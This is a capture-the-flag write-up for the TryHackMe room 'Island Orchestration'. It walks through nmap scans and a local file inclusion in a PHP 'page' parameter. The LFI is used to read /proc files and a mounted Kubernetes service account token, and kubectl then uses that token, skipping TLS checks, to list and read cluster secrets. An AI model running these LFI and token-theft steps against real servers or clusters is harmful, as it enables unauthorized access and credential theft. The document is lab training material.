---
title: "Island Orchestration TryHackMe Writeup"
last_modified_at: 2022-07-11T17:48:02-05:00
categories:
  - thm
author_profile: false
tags:
  - thm
  - tryhackme
  - Island Orchestration
  - Linux
  - nmap
  - kubernates
  - LFI
  - secrets
  - serviceaccount
  - ffuf
  - privilege escalation
  - docker
---

<img alt="island" src="/assets/images/thm/islandorchestration/island.png" width="200px" height="150px">

<script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="reddevil2020" data-description="Support me on Buy me a coffee!"  data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>


![image](/assets/images/thm/islandorchestration/Pasted image 20220711173446.png)

  
[Island Orchestration](https://tryhackme.com/room/islandorchestration) is a medium rated room in Tryhackme by [tryhackme](https://tryhackme.com/p/tryhackme), [cmnatic](https://tryhackme.com/p/cmnatic), [timtaylor](https://tryhackme.com/p/timtaylor) and [congon4tor](https://tryhackme.com/p/congon4tor). Using the LFI on the webserver, we grab the token for the serviceaccount of the pod running inside a k8s cluster and using that token we read the flag.

# Nmap Scan
## Full Port Scan
```bash
┌──(kali㉿kali)-[~/ctf/thm/islandorchestration]
└─$ cat nmap/allports
# Nmap 7.91 scan initiated Mon Jul 11 12:51:59 2022 as: nmap -p- --min-rate 1000 -v -oN nmap/allports 10.10.168.77
Nmap scan report for 10.10.168.77
Host is up (0.37s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8443/tcp open  https-alt

Read data files from: /usr/bin/../share/nmap
# Nmap done at Mon Jul 11 12:53:11 2022 -- 1 IP address (1 host up) scanned in 72.46 seconds
```

We have 3 ports open. SSH is running on port 22, webserver is running on port 80 and an unknown service is running on port 8443.

## Detailed Nmap Scan
```bash
┌──(kali㉿kali)-[~/ctf/thm/islandorchestration]
└─$ cat nmap/detail
# Nmap 7.91 scan initiated Mon Jul 11 14:10:43 2022 as: nmap -sC -sV -oN nmap/detail -p22,80,8443 10.10.168.77
Nmap scan report for 10.10.168.77
Host is up (0.30s latency).

PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 9f:ae:04:9e:f0:75:ed:b7:39:80:a0:d8:7f:bd:61:06 (RSA)
|   256 cf:cb:89:62:99:11:d7:ca:cd:5b:57:78:10:d0:6c:82 (ECDSA)
|_  256 5f:11:10:0d:7c:80:a3:fc:d1:d5:43:4e:49:f9:c8:d2 (ED25519)
80/tcp   open  http          Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Best tropical islands
8443/tcp open  ssl/https-alt
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 403 Forbidden
|     Audit-Id: 54ad33cc-fb53-4c4f-9690-704b7480d7c4
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: a5c8dc51-1beb-4524-9996-fcbdf17ad8d9
|     X-Kubernetes-Pf-Prioritylevel-Uid: 9a40dace-d4fe-4ce4-8625-787c338bd84b
|     Date: Mon, 11 Jul 2022 08:26:00 GMT
|     Content-Length: 212
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/nice ports,/Trinity.txt.bak"","reason":"Forbidden","details":{},"code":403}
|   GetRequest:
|     HTTP/1.0 403 Forbidden
|     Audit-Id: e1437a2c-7185-4552-b9d7-600c1671efa5
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: a5c8dc51-1beb-4524-9996-fcbdf17ad8d9
|     X-Kubernetes-Pf-Prioritylevel-Uid: 9a40dace-d4fe-4ce4-8625-787c338bd84b
|     Date: Mon, 11 Jul 2022 08:25:57 GMT
|     Content-Length: 185
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
|   HTTPOptions:
|     HTTP/1.0 403 Forbidden
|     Audit-Id: 251bee7d-63c7-47d3-825a-4bb109030a48
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: a5c8dc51-1beb-4524-9996-fcbdf17ad8d9
|     X-Kubernetes-Pf-Prioritylevel-Uid: 9a40dace-d4fe-4ce4-8625-787c338bd84b
|     Date: Mon, 11 Jul 2022 08:25:58 GMT
|     Content-Length: 189
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
|_http-title: Site doesn't have a title (application/json).
| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:192.168.49.2, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
| Not valid before: 2022-01-05T23:39:08
|_Not valid after:  2025-01-05T23:39:08
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|   h2
|_  http/1.1
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.91%T=SSL%I=7%D=7/11%Time=62CBDE95%P=aarch64-unknown-li
SF:nux-gnu%r(GetRequest,22F,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x2
SF:0e1437a2c-7185-4552-b9d7-600c1671efa5\r\nCache-Control:\x20no-cache,\x2
SF:0private\r\nContent-Type:\x20application/json\r\nX-Content-Type-Options
SF::\x20nosniff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x20a5c8dc51-1beb-4524-9
SF:996-fcbdf17ad8d9\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x209a40dace-d4fe
SF:-4ce4-8625-787c338bd84b\r\nDate:\x20Mon,\x2011\x20Jul\x202022\x2008:25:
SF:57\x20GMT\r\nContent-Length:\x20185\r\n\r\n{\"kind\":\"Status\",\"apiVe
SF:rsion\":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"for
SF:bidden:\x20User\x20\\\"system:anonymous\\\"\x20cannot\x20get\x20path\x2
SF:0\\\"/\\\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n")%
SF:r(HTTPOptions,233,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x20251bee
SF:7d-63c7-47d3-825a-4bb109030a48\r\nCache-Control:\x20no-cache,\x20privat
SF:e\r\nContent-Type:\x20application/json\r\nX-Content-Type-Options:\x20no
SF:sniff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x20a5c8dc51-1beb-4524-9996-fcb
SF:df17ad8d9\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x209a40dace-d4fe-4ce4-8
SF:625-787c338bd84b\r\nDate:\x20Mon,\x2011\x20Jul\x202022\x2008:25:58\x20G
SF:MT\r\nContent-Length:\x20189\r\n\r\n{\"kind\":\"Status\",\"apiVersion\"
SF::\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden:
SF:\x20User\x20\\\"system:anonymous\\\"\x20cannot\x20options\x20path\x20\\
SF:\"/\\\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n")%r(F
SF:ourOhFourRequest,24A,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x2054a
SF:d33cc-fb53-4c4f-9690-704b7480d7c4\r\nCache-Control:\x20no-cache,\x20pri
SF:vate\r\nContent-Type:\x20application/json\r\nX-Content-Type-Options:\x2
SF:0nosniff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x20a5c8dc51-1beb-4524-9996-
SF:fcbdf17ad8d9\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x209a40dace-d4fe-4ce
SF:4-8625-787c338bd84b\r\nDate:\x20Mon,\x2011\x20Jul\x202022\x2008:26:00\x
SF:20GMT\r\nContent-Length:\x20212\r\n\r\n{\"kind\":\"Status\",\"apiVersio
SF:n\":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidd
SF:en:\x20User\x20\\\"system:anonymous\\\"\x20cannot\x20get\x20path\x20\\\
SF:"/nice\x20ports,/Trinity\.txt\.bak\\\"\",\"reason\":\"Forbidden\",\"det
SF:ails\":{},\"code\":403}\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jul 11 14:12:56 2022 -- 1 IP address (1 host up) scanned in 133.12 seconds
```

Here are the findings from the Nmap result.
- HTTP Webserver is running on port 8433 with TLS enabled.
- From the Subject Alternate Name, we know that this is the certificate for kubeapi server which is a component of a kubernetes cluster.
- Anonymous login is not enabled.

Since there is very little attack surface for SSH and anonymous login is disabled for the kubeapi server, let us start our enumeration with HTTP service on port 80.

## Enumerating Web Service running on Port 80
![image](/assets/images/thm/islandorchestration/Pasted image 20220711142151.png)

While clicking around, I noticed that the `index.php` was accepting a GET parameter page to load other pages.
![image](/assets/images/thm/islandorchestration/Pasted image 20220711142304.png)
### Testing if the parameter page is vulnerable to LFI
![image](/assets/images/thm/islandorchestration/Pasted image 20220711142351.png)
It turns out it was vulnerable to LFI. But it turns out it was very restrictive. I was unable to use any PHP wrappers to read the content of the PHP files. As there was only one root user on the `/etc/passwd` file made me think if I were in a docker container.

## Enumerating Files
### Making sure we are inside a docker container
![image](/assets/images/thm/islandorchestration/Pasted image 20220711142717.png)
In usual host, process 1 is always `init`  or `systemd` which is the parent process of all processes. Following is the output of the same file `/proc/1/cmdline` on my local kali machine.
```bash
┌──(kali㉿kali)-[~/ctf/thm/islandorchestration]
└─$ cat /proc/1/cmdline
/sbin/init splash
```
Since the process 1 on the webserver is apache, it is definitely a docker container.  Since this is a pod in a kubernetes cluster, we won't be able to get RCE by using log poisioning since everything will be written to `/dev/stdout`.

### Failed Attempts
1. Trying to SSH keys for root user since SSH was enabled on the machine  but after checking `/proc/net/tcp`, SSH was not enabled on the container and it would not have mattered as all the logs are written to `/dev/stdout`
2. Trying to read `~/.kube/config` from root user and www-data user's home directory but were not present on the container
3. Trying to read `/var/log/apache2/logs/access.log` but was not present.
4. Trying to include file from remote server and get code execution but was not possible
5. Read the code using PHP filter but was not possible


After trying so many things to escalate LFI to RCE, one thing struck my mind which is serviceaccounts. Each and every deployment in kubernetes uses a service account. If nothing is specified, a default service account is used which do have very minimal privileges by default but we can always add permission to the default service account and the token for these serviceaccounts is always mounted inside the container.


### Mounted serviceaccount tokens
If we check the content of `/proc/mounts`, we can see that the service account tokens is mounted on `/run/secrets/kubernetes.io/serviceaccount`
![image](/assets/images/thm/islandorchestration/Pasted image 20220711171717.png)

This path contains 3 files: `ca.crt`, `token` and namespace. Let us download the contents of all 3 files.

### Ca.crt
```bash
──(kali㉿kali)-[~/ctf/thm/islandorchestration/values]
└─$ curl -s http://10.10.228.155/?page=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt  -q | grep 'card-body' -A20
                                        <div class="card-body">

                                -----BEGIN CERTIFICATE-----
MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p
a3ViZUNBMB4XDTIyMDEwNTIwMTgyM1oXDTMyMDEwNDIwMTgyM1owFTETMBEGA1UE
AxMKbWluaWt1YmVDQTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAN1T
YzgsOlboYP3wxW+9b0dT2XhSqCJAk4D/IVxFC/sVBTf1mePaqSRyeIsGY1TiOzY1
T1V0CMavDKWhaG8SdnRbPT/pDoVLKv+HFgpurh5m8nTJoEIQIrM30zGzwQ+sVMZJ
e5IqqfaHw7eBVBWfex5wmtJ1BhKDUJlG4cNrEDi+z29qD8OZVQxuKsYtvym87SZA
UZf6hbsUqIXhP6m1DOJGrTr0hEy6CsfCm78DH6oZtpLzMtRSP1gYDu6KrpyeOWz3
4jdKX+CRmprp/95JSJPbZ9luYpdCjgzAKZkWKgaPnGpoO6TZrTwacjvu0qTFk8cq
AxzBkH0huspRGDEIUhcCAwEAAaNhMF8wDgYDVR0PAQH/BAQDAgKkMB0GA1UdJQQW
MBQGCCsGAQUFBwMCBggrBgEFBQcDATAPBgNVHRMBAf8EBTADAQH/MB0GA1UdDgQW
BBTwCj9T5f5vOQrHkAJ01N5+hYMuEDANBgkqhkiG9w0BAQsFAAOCAQEAb7I4l8LQ
++Xy+Dcvj8YW9GenU3W76no9YbATK/NtqOemru21I8yD42x12UZ7xCovn5ea1MCg
tP8y+oSAQdoOt8JO2GrD/7xy64yfLJ5hqYUiJz6BCOF1576kQZI0JwB6XCXSZSwh
Jw8dcrsOMQsxOf6QdoyZ2zNUCknMm3hpUEF8xwQmWL7uo+C0EGpSJvlOKHVbZh3e
SGKvzvk7GSKTJF5FgI4G8X5/JVmDdN9Mk3kl8PKFNP6SGAIWolFMsA9iCxou1Apa
5zfKX918bnNqKmDFIJOdjadvOl8oNcCg1GaA4htOV+sFk3zxCNNGW3i+c97J1EQm
VeBlHLi+W+gtHw==
-----END CERTIFICATE-----
--
```

### Token
```bash
┌──(kali㉿kali)-[~/ctf/thm/islandorchestration/values]
└─$ curl -s http://10.10.228.155/?page=/var/run/secrets/kubernetes.io/serviceaccount/token  -q | grep 'card-body' -A20
                                        <div class="card-body">

                                eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjg5MDc0OTM4LCJpYXQiOjE2NTc1Mzg5MzgsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJpc2xhbmRzLTc2NTViNzc0OWYtenZxNTIiLCJ1aWQiOiJiMzEwNjkyMS00OTBhLTQ3NjctOGQ1OS03MmY2NjkxYmY5YzAifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImlzbGFuZHMiLCJ1aWQiOiI5OTIzOTA1OS00ZjZjLTQwNmItODI5NC01YTU1ZmJjMTQzYjAifSwid2FybmFmdGVyIjoxNjU3NTQyNTQ1fSwibmJmIjoxNjU3NTM4OTM4LCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6ZGVmYXVsdDppc2xhbmRzIn0.Jrz33AEhPCUc6bELuk4GFBv2kENva-IrcrPNq_a4iJM0S6eZOiZhjcwiqR2z28XiTHSAfE3R2Vnc2-9lPKoZpWursUo3Hvgm7UOkbV1gTLAFT4PTOux-ZVkZedExk7rDFNko02KEFUo7zKZPSy2-PUeoUxxcdvOiGM4CrARTOUT4zgJbVH4FKQNHkeS64VFvG3H8k9V4b4O2ta3dVHiMsn7AZFAR9x1Xyee5obIp40dnIesTAujPQxLZRI4q7ljepXzkysa7__YOQtZdH2YdzEDntQvQvBrsfmWUW77-Qz37iqFTbcAe6_wMKrzoGANG3-q7KcWSQlcyfxKpQHhxJQ                   </div>
                </div>


            </div>
```


### Namespace
```bash
┌──(kali㉿kali)-[~/ctf/thm/islandorchestration/values]
└─$ curl -s http://10.10.228.155/?page=/var/run/secrets/kubernetes.io/serviceaccount/namespace  -q | grep 'card-body' -A5
                                        <div class="card-body">

                                default                 </div>
                </div>

```

The namespace is default.

Since we have the token and the kube-api server is publicly reachable, let us use this token to authenticate againist the cluster impersonating the serviceaccount. For this we need kubectl which is already installed on my box. If you do not have on your machine, check [this](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/) link to download it.

## Trying to contact the server

```bash
┌──(kali㉿kali)-[~/ctf/thm/islandorchestration/values]
└─$ kubectl --token=`cat token` --namespace=default --server=https://10.10.228.155:8443 get pods
Unable to connect to the server: x509: certificate is valid for 192.168.49.2, 10.96.0.1, 127.0.0.1, 10.0.0.1, not 10.10.228.155
```
It says the certificate is only valid for the given IPs.

After some googling, I came to know that we can bypass the TLS checks using `--insecure-skip-tls-verify`.
### Trying to list the pods
```bash
┌──(kali㉿kali)-[~/ctf/thm/islandorchestration/values]
└─$ kubectl --token=`cat token` --insecure-skip-tls-verify --namespace=default --server=https://10.10.228.155:8443 get pods                                                                           130 ⨯
Error from server (Forbidden): pods is forbidden: User "system:serviceaccount:default:islands" cannot list resource "pods" in API group "" in the namespace "default"
```
This time we are successfully authenticated but we are not authorized to list the pods on the default namespace. Let us check the privileges for this serviceaccount.

### Checking the privileges of the service account
```bash
┌──(kali㉿kali)-[~/ctf/thm/islandorchestration/values]
└─$ kubectl --token=`cat token` --insecure-skip-tls-verify --namespace=default --server=https://10.10.228.155:8443 auth can-i --list                                                                    1 ⨯
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
secrets                                         []                                    []               [get list]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
```

One interesting privilege is that this serviceaccount can list and get secrets which means it can list it and read it. So, let us try and list the secrets.

### Listing secrets
```bash
┌──(kali㉿kali)-[~/ctf/thm/islandorchestration/values]
└─$ kubectl --token=`cat token` --insecure-skip-tls-verify --namespace=default --server=https://10.10.228.155:8443 get secrets                                                                          1 ⨯
NAME                  TYPE                                  DATA   AGE
default-token-8bksk   kubernetes.io/service-account-token   3      185d
flag                  Opaque                                1      130d
islands-token-dtrnt   kubernetes.io/service-account-token   3      130d
```

### Reading the secret
```bash
┌──(kali㉿kali)-[~/ctf/thm/islandorchestration/values]
└─$ kubectl --token=`cat token` --insecure-skip-tls-verify --namespace=default --server=https://10.10.228.155:8443 get secrets flag -o yaml
apiVersion: v1
data:
  flag: ZmxhZ3swOGJlZDlmYzBiYzZkOTRmZmY5ZTUxZjI5MTU3Nzg0MX0=
kind: Secret
metadata:
  annotations:
    kubectl.kubernetes.io/last-applied-configuration: |
      {"apiVersion":"v1","data":{"flag":"ZmxhZ3************Nzg0MX0="},"kind":"Secret","metadata":{"annotations":{},"name":"flag","namespace":"default"},"type":"Opaque"}
  creationTimestamp: "2022-03-02T19:47:07Z"
  name: flag
  namespace: default
  resourceVersion: "7072"
  uid: 750ac081-742f-4594-a6f4-8fa3e1bbceb7
type: Opaque
```

We are successfully able to read the secret. K8s secrets are always base64 encoded, so we have to decode them to get the real content.

### Decoding base64 string
```bash
┌──(kali㉿kali)-[~/ctf/thm/islandorchestration/values]
└─$ echo -n ZmxhZ3***************TU3Nzg0MX0= | base64 -d                                                                                                                            1 ⨯
flag{08bed*************7841}
```